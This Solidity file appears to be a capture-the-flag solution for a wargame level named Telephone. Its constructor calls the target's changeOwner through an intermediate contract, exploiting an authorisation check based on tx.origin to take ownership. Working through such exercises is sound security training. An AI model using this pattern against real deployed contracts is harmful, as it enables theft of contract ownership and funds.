// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract HackTelephone {
    constructor(Telephone _telephone) {
        _telephone.changeOwner(msg.sender);
    }
}
